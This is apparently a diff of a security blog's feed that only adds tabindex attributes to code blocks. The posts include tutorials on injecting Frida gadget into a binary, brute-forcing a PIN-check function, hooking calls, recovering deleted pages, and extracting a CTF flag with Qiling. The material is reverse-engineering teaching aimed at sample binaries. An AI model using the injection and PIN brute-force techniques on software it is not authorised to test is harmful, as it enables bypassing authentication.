-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# on victim&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# on victim&lt;/span&gt;
 LD_PRELOAD&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;./frida-gadget.so ./crypt
 
 &lt;span style=&#34;color:#75715e&#34;&gt;# on analysis machine&lt;/span&gt;
 frida-ps -R &lt;span style=&#34;color:#75715e&#34;&gt;# should yield gadget process&lt;/span&gt;
 frida -R Gadget
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# on victim&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# on victim&lt;/span&gt;
 $ patchelf --add-needed ../frida-gadget.so crypt
 
 &lt;span style=&#34;color:#75715e&#34;&gt;# on analysis machine&lt;/span&gt;
 $ ./crypt
 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Frida INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Listening on 127.0.0.1 TCP port &lt;span style=&#34;color:#ae81ff&#34;&gt;27042&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Configure with &lt;code&gt;frida-gadget.config&lt;/code&gt; (default):&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;{
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;{
   &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;interaction&amp;#34;&lt;/span&gt;: {
     &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;listen&amp;#34;&lt;/span&gt;,
     &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;address&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;,
@@ -1323,13 +1323,13 @@ $ ./crypt
   }
 }
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Scripting:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;{
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;{
   &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;interaction&amp;#34;&lt;/span&gt;: {
     &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;script&amp;#34;&lt;/span&gt;,
     &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/root/code/embedded-agent.js&amp;#34;&lt;/span&gt;
   }
 }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPinPtr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DebugSymbol&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getFunctionByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_pin&amp;#34;&lt;/span&gt;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPinPtr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DebugSymbol&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getFunctionByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_pin&amp;#34;&lt;/span&gt;);
 &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPin&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;NativeFunction&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;testPinPtr&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;int&amp;#34;&lt;/span&gt;, [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pointer&amp;#34;&lt;/span&gt;]);
 
 &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9999&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
@@ -1353,7 +1353,7 @@ $ ./crypt
 &lt;/li&gt;
 &lt;li&gt;Run &amp;amp; watch new injected behaviour&lt;/li&gt;
 &lt;/ol&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;onEnter&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;state&lt;/span&gt;) {
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;onEnter&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;state&lt;/span&gt;) {
     &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ptr&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1337&amp;#39;&lt;/span&gt;);
     &lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;printf(&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;
       &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;format=&amp;#34;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;readUtf8String&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#34;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;
@@ -1361,7 +1361,7 @@ $ ./crypt
   },
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;examples&#34;&gt;Examples&lt;/h2&gt;
 &lt;h3 id=&#34;spawn-web-server&#34;&gt;Spawn web server&lt;/h3&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;import&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt; } &lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./logger&amp;#34;&lt;/span&gt;;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;import&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt; } &lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./logger&amp;#34;&lt;/span&gt;;
 &lt;span style=&#34;color:#66d9ef&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http&amp;#34;&lt;/span&gt;;
 
 &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPinPtr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DebugSymbol&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getFunctionByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_pin&amp;#34;&lt;/span&gt;);
@@ -1391,7 +1391,7 @@ $ ./crypt
         }).&lt;span style=&#34;color:#a6e22e&#34;&gt;listen&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;);
     }
 }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; frida
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; frida
 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
 
 &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;frida-agent-example/_agent.js&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
@@ -1407,7 +1407,7 @@ api&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;http_server()
 
 &lt;span style=&#34;color:#75715e&#34;&gt;# keep the server alive now&lt;/span&gt;
 sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdin&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;npm run build &lt;span style=&#34;color:#75715e&#34;&gt;# or watch&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;npm run build &lt;span style=&#34;color:#75715e&#34;&gt;# or watch&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;https://frida.re&#34;&gt;https://frida.re&lt;/a&gt;&lt;/li&gt;
@@ -1430,7 +1430,7 @@ sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdin&lt;span style=&
 &lt;p&gt;If you know where this resource is placed (you know it&amp;rsquo;s url) the easiest method is to go to &lt;a href=&#34;https://archive.org/web/&#34;&gt;Web Archive&lt;/a&gt;, type your url and select a mirror from the timeline.&lt;/p&gt;
 &lt;h3 id=&#34;google-cache&#34;&gt;Google cache&lt;/h3&gt;
 &lt;p&gt;Of course not all Internet resources are mirrored, so it may happen that web archive doesn&amp;rsquo;t have saved url interesting for you. If your resource was deleted recently you can always search for it&amp;rsquo;s search browser &lt;em&gt;cached&lt;/em&gt; version, for google you need to type in search field:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;cache:&amp;lt;url&amp;gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;cache:&amp;lt;url&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can also use other search browser to achieve similar results.&lt;/p&gt;
 &lt;h3 id=&#34;hunting-for-deleted-things&#34;&gt;Hunting for deleted things&lt;/h3&gt;
 &lt;p&gt;Finally if you don&amp;rsquo;t know your resource url you can also use other search browser than google, like &lt;a href=&#34;https://duckduckgo.com/&#34;&gt;DuckDuckGo&lt;/a&gt;. It may be useful, because google is removing dead url pretty quickly (it is also intentionally hiding some websites), so it is always good to use other search browsers.&lt;/p&gt;</content>
@@ -1466,7 +1466,7 @@ sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdin&lt;span style=&
 &lt;p&gt;Let&amp;rsquo;s imagine that we have this simple task:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;/img/task-code.png&#34; alt=&#34;Task&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Obviously flag is generated from the stack strings with some on-the-fly operations, we can very easly capture the flag by setting couple of breakpoints in the debugger at addresses: &lt;code&gt;0x804852e&lt;/code&gt; and &lt;code&gt;0x804853d&lt;/code&gt; and check the contents of &lt;em&gt;eax&lt;/em&gt; (notice that second part of the flag actually replaces the 1st part) or we can write simple script using Qiling:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; qiling &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; qiling &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
 &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; os &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; environ
 
 EXEC_FILE &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./task&amp;#34;&lt;/span&gt;]
@@ -1498,24 +1498,24 @@ FLAG &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
 &lt;li&gt;Rootfs - which should match target architecture.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;In my case environment variable &lt;code&gt;$QILING_ROOTFS&lt;/code&gt; points to &lt;code&gt;$QILING_REPO_DIR/examples/rootfs&lt;/code&gt;, above mentioned is a linux x86 binary so we are selecting &lt;code&gt;x86_linux&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; qiling &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; qiling &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
 &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; os &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; environ
 
 EXEC_FILE &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./task&amp;#34;&lt;/span&gt;]
 ROOTFS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/x86_linux&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(environ[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;QILING_ROOTFS&amp;#34;&lt;/span&gt;])
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We want to &lt;del&gt;break&lt;/del&gt; hook at specified addresses, so we can achieve that by calling &lt;code&gt;hook_address(callback, address)&lt;/code&gt; I decided to reuse twice the same function, but you can create separate functions for that:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hook_address(on_hook, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x804852e&lt;/span&gt;)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hook_address(on_hook, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x804852e&lt;/span&gt;)
 ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hook_address(on_hook, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x804853d&lt;/span&gt;) 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After everything is setup we can run the binary with &lt;code&gt;ql.run()&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;Our hook method reads the value from &lt;em&gt;eax&lt;/em&gt; register and saves it in global variable:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;on_hook&lt;/span&gt;(ql : core&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Qiling) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;:
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;on_hook&lt;/span&gt;(ql : core&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Qiling) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;:
     addr_flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;reg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eax
     FLAG&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mem&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read(addr_flag, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;))
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Notice that we are reading twice the same amount of bytes (&lt;code&gt;ql.mem.read(addr_flag, 0x13)&lt;/code&gt;), so we need to truncate these array before printing it on the screen:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; FLAG[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;][:&lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; FLAG[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][:&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; FLAG[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;][:&lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; FLAG[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][:&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()
     print(flag)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;By default Qiling displays &lt;code&gt;strace&lt;/code&gt; log, if you don&amp;rsquo;t want to see it or you want to see only logs from specific methods you can use filters (you need to change this variable before running the qiling):&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# mute strace log&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# mute strace log&lt;/span&gt;
 ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
 
 &lt;span style=&#34;color:#75715e&#34;&gt;# display only &amp;#34;read&amp;#34; functions&lt;/span&gt;
@@ -1554,7 +1554,7 @@ ql&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter &lt;span style=
